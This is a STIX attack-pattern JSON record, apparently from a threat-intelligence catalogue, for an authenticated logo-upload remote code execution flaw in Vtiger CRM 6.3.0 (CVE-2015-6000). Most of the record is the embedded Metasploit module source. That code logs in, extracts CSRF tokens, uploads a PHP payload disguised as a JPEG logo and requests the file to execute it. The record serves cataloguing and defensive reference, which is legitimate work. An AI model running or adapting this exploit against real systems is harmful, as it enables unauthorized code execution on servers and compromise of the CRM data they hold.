{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--78b8b526-a1c2-4295-945d-9170d3164ecd",
    "created": "2024-08-14T17:08:48.271929Z",
    "modified": "2024-08-14T17:08:48.271933Z",
    "name": "Vtiger CRM - Authenticated Logo Upload RCE",
    "description": " Vtiger 6.3.0 CRM's administration interface allows for the upload of a company logo. Instead of uploading an image, an attacker may choose to upload a file containing PHP code and run this code by accessing the resulting PHP file.  This module was tested against vTiger CRM v6.3.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vtiger_logo_upload_exec.rb",
            "external_id": "vtiger_logo_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-6000"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Vtiger CRM - Authenticated Logo Upload RCE',\n      'Description' => %q{\n        Vtiger 6.3.0 CRM's administration interface allows for the upload of a company logo.\n        Instead of uploading an image, an attacker may choose to upload a file containing PHP code and\n        run this code by accessing the resulting PHP file.\n\n        This module was tested against vTiger CRM v6.3.0.\n      },\n      'Author' =>\n        [\n          'Benjamin Daniel Mussler', # Discoverys\n          'Touhid M.Shaikh <touhidshaikh22@gmail.com>', # Metasploit Module\n          'SecureLayer7.net' # Metasploit Module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2015-6000'],\n          ['CVE','2016-1713'],\n          ['EDB', '38345']\n        ],\n      'DefaultOptions' =>\n        {\n          'Encoder' => 'php/base64',\n          'RPORT' => 8888\n        },\n      'Privileged' => false,\n      'Platform'   => ['php'],\n      'Arch'       => ARCH_PHP,\n      'Targets' =>\n        [\n          ['vTiger CRM v6.3.0', {}],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-09-28'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Base vTiger CRM directory path', '/']),\n        OptString.new('USERNAME', [ true, 'Username to authenticate with', 'admin']),\n        OptString.new('PASSWORD', [ true, 'Password to authenticate with', ''])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('PHPSHORTTAG', [true, 'Use short open php tags around payload', true])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'index.php') })\n\n    unless res\n      vprint_error(\"Unable to access the index.php file\")\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200\n      vprint_error(\"Error accessing the index.php file\")\n      return CheckCode::Unknown\n    end\n\n    if res.body =~ /<small> Powered by vtiger CRM (.*.0)<\\/small>/i\n      vprint_status(\"vTiger CRM version: #{$1}\")\n      if $1 == '6.3.0'\n        return CheckCode::Vulnerable\n      else\n        return CheckCode::Detected\n      end\n    end\n\n    CheckCode::Safe\n  end\n\n  # Login Function.\n  def login\n    # Dummy Request for grabbing CSRF token and PHPSESSION ID\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vhost' => \"#{rhost}\",\n    })\n\n    # Grabbing CSRF token from body\n    /var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n    vprint_good(\"CSRF Token for login: #{csrf}\")\n\n    # Get Login now.\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        'module' => 'Users',\n        'action' => 'Login',\n      },\n      'vars_post' => {\n        '__vtrftk' => csrf,\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      },\n    })\n\n    unless res\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to Login request\")\n    end\n\n    cookie = nil\n    if res.code == 302 && res.headers['Location'].include?(\"index.php?module=Users&parent=Settings&view=SystemSetup\")\n      vprint_good(\"Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n      cookie = res.get_cookies.split[-1]\n    end\n\n    unless cookie\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]\")\n    end\n\n    cookie\n  end\n\n  def exploit\n    cookie = login\n    unless cookie\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Authentication Failed\")\n    end\n\n    pay_name = rand_text_alpha(rand(5..10)) + \".php\"\n\n    # Retrieve CSRF token\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vhost' => \"#{rhost}\",\n      'cookie' => cookie\n    })\n\n    # Grabbing CSRF token from body\n    /var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n    vprint_good(\"CSRF Token for Form Upload: #{csrf}\")\n\n    stager = datastore['PHPSHORTTAG'] ? '<? ' : '<?php '\n    stager << payload.encoded\n    stager << ' ?>'\n\n    # Setting Company Form data\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(csrf, nil, nil, \"form-data; name=\\\"__vtrftk\\\"\") # CSRF token\n    post_data.add_part('Vtiger', nil, nil, \"form-data; name=\\\"module\\\"\")\n    post_data.add_part('Settings', nil, nil, \"form-data; name=\\\"parent\\\"\")\n    post_data.add_part('CompanyDetailsSave', nil, nil, \"form-data; name=\\\"action\\\"\")\n    post_data.add_part(stager, \"image/jpeg\", nil, \"form-data; name=\\\"logo\\\"; filename=\\\"#{pay_name}\\\"\")\n    post_data.add_part('vtiger', nil, nil, \"form-data; name=\\\"organizationname\\\"\")\n    data = post_data.to_s\n\n    print_status(\"Uploading payload: #{pay_name}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vhost' => \"#{rhost}\",\n      'cookie' => cookie,\n      'connection' => 'close',\n      'headers' => {\n        'Referer' => \"http://#{peer}/index.php?parent=Settings&module=Vtiger&view=CompanyDetails\",\n        'Upgrade-Insecure-Requests' => '1',\n      },\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n    })\n\n    unless res && res.code == 302\n      fail_with(Failure::None, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    # Cleanup file\n    register_files_for_cleanup(pay_name)\n\n    vprint_status(\"Executing Payload: #{peer}/test/logo/#{pay_name}\" )\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"test\", \"logo\", pay_name)\n    })\n\n    if res && res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Payload not executed\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-28",
    "x_mitre_platforms": [
        "['php']"
    ]
}